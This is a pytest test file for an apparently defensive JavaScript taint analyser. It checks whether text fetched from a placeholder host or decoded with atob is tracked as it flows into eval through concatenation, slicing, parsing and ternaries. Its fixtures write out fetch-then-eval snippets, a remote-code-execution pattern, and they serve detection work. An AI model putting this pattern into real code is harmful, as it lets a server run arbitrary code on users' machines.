"""A value that cannot carry code does not carry the label of the reply or the decode it came from
(reviews/pypi-98/26). `eval(t.length)` evaluates a number: nothing a server sent runs. The label stays
through every transform that can pass text on: concatenation, a slice, a trim, a parsed field, a ternary."""

from __future__ import annotations

import pytest

from cordon_scanner.analysis.javascript.js_flow import JsFlow

REPLY = "fetch('https://h.invalid/x').then(r => r.text()).then(t => {sink});"
DECODED = "const t = atob(s); {sink};"


class Flows:
    @staticmethod
    def kinds(template: str, sink: str) -> set[str]:
        found: set[str] = set()
        for flow in JsFlow.flows(template.replace("{sink}", sink)):
            if flow.sink == "execute":
                found |= set(flow.sources)
        return found & {"network_response", "decoded"}


class TestAValueThatCannotCarryCode:
    @pytest.mark.parametrize(
        "sink",
        [
            "eval(t.length)",
            "eval(t.indexOf('a'))",
            "eval(t.lastIndexOf('a'))",
            "eval(t.includes('a'))",
            "eval(t.startsWith('a'))",
            "eval(typeof t)",
            "eval(t === 'a')",
            "eval(t !== 'a')",
            "eval(t.length > 3)",
            "eval(!t)",
            "eval(JSON.stringify(t))",
        ],
    )
    def test_the_reply_stops_at_it(self, sink: str) -> None:
        assert Flows.kinds(REPLY, sink) == set()

    @pytest.mark.parametrize("sink", ["eval(t.length)", "eval(typeof t)", "eval(t === 'a')"])
    def test_the_decode_stops_at_it(self, sink: str) -> None:
        assert Flows.kinds(DECODED, sink) == set()


class TestEveryTransformThatCanPassTextOnKeepsTheLabel:
    @pytest.mark.parametrize(
        "sink",
        [
            "eval(t)",
            "eval('x' + t)",
            "eval(t + 'x')",
            "eval(t.slice(0, 4))",
            "eval(t.trim())",
            "eval(t.toString())",
            "eval(JSON.parse(t).code)",
            "eval(JSON.parse(t))",
            "eval(t || 'a')",
            "eval(t && 'a')",
            "eval(t === 'a' ? t : '1')",
            "eval(t.length ? t : '1')",
            "eval(typeof t + t)",
            "eval(t.length + t)",
            "eval((t === 'a', t))",
            "eval(`${t}`)",
        ],
    )
    def test_the_reply_reaches_it(self, sink: str) -> None:
        assert "network_response" in Flows.kinds(REPLY, sink)

    def test_a_field_of_a_parsed_reply_keeps_it(self) -> None:
        text = "fetch('https://h.invalid/x').then(r => r.json()).then(d => eval(d.status));"
        assert "network_response" in {s for f in JsFlow.flows(text) for s in f.sources}

    @pytest.mark.parametrize("sink", ["eval(t)", "eval(t.slice(1))", "eval('x' + t)"])
    def test_the_decode_reaches_it(self, sink: str) -> None:
        assert "decoded" in Flows.kinds(DECODED, sink)
